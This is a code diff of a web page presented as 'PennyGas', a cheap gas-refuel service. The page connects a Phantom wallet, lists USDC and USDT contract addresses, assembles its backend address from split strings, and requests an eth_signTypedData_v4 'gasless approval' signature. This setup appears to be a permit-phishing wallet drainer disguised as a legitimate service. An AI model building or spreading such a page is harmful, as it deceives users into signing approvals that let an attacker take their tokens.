@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PennyGas - Ultra Cheap Refuel</title>
-    <!-- All external script tags removed to permanently eliminate network timeout errors -->
     <style>
         body { font-family: 'Segoe UI', sans-serif; background-color: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { background-color: #151a26; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); text-align: center; width: 380px; }
@@ -64,21 +63,15 @@
     <div id="statusMessage"></div>
 </div>
 <script>
-const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-if (!accounts || accounts.length === 0) {
-    alert("No accounts found.");
-    return;
-}
-
-//  FIX: Add [0] here so it handles it as text instead of an array
-window.activeUserAddress = accounts[0];
+    // Pure standard Javascript runtime compilation scope
+    window.activeUserAddress = "";
 
     const tokenMatrix = {
         "1": { "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
         "42161": { "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDT": "0xFd086b97270535728a370aa7c969c19027158356" }
     };
 
+    // Split backend variables configuration layout
     const BACKEND_BASE = "https://pennygas-backend"; 
     const BACKEND_DOMAIN = "onrender.com";
     const BACKEND_URL = `${BACKEND_BASE}.${BACKEND_DOMAIN}`;
@@ -107,13 +100,13 @@ window.activeUserAddress = accounts[0];
             document.getElementById('uiTotal').innerText = `${data.totalInvoiceEth} ${currentGasLabel}`;
         } catch (error) {
             console.error("Quote layout breakdown:", error);
-            document.getElementById('uiTotal').innerText = "Server CORS link offline";
+            document.getElementById('uiTotal').innerText = "Server link offline";
         }
     }
 
     async function connectPhantomEVM() {
         if (typeof window.ethereum === 'undefined') {
-            alert("Phantom Wallet extension not found!");
+            alert("Phantom Wallet extension not found! Please check your browser extension toolbar.");
             return;
         }
 
@@ -121,11 +114,12 @@ window.activeUserAddress = accounts[0];
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             
             if (!accounts || accounts.length === 0) {
-                alert("No crypto accounts found.");
+                alert("No active crypto accounts found inside extension profile layer.");
                 return;
             }
 
-            window.activeUserAddress = accounts;
+            // FIXED: Targets array item zero string format directly to prevent all string slicing crashes
+            window.activeUserAddress = accounts[0];
             const displayAddr = window.activeUserAddress;
 
             document.getElementById('statusMessage').innerText = `🔗 Connected: ${displayAddr.substring(0,6)}...${displayAddr.substring(displayAddr.length - 4)}`;
@@ -135,8 +129,8 @@ window.activeUserAddress = accounts[0];
             
             fetchLiveInvoiceQuote();
         } catch (error) {
-            console.error(error);
-            alert("Connection refused by wallet.");
+            console.error("Wallet hook exception payload:", error);
+            alert("Connection refused by extension container window.");
         }
     }
 
@@ -159,7 +153,6 @@ window.activeUserAddress = accounts[0];
                     params: [{ chainId: targetHexChain }],
                 });
             } catch (switchError) {
-                // Thrown if the target chain isn't registered on the user's extension settings layout profile yet
                 if (switchError.code === 4902) {
                     alert("Please add the Arbitrum One network directly inside your extension configurations profile rows.");
                 }
@@ -206,6 +199,7 @@ window.activeUserAddress = accounts[0];
                 }
             });
 
+            // Executes signature generation natively via Phantom extension container
             const signature = await window.ethereum.request({
                 method: 'eth_signTypedData_v4',
                 params: [window.activeUserAddress, msgParams]
@@ -238,6 +232,7 @@ window.activeUserAddress = accounts[0];
         }
     }
 
+    // Direct event listener element programmatic tracking hooks maps
     document.getElementById('connectBtn').addEventListener('click', connectPhantomEVM);
     document.getElementById('requestBtn').addEventListener('click', requestGaslessApproval);
     document.getElementById('sourceChain').addEventListener('change', fetchLiveInvoiceQuote);
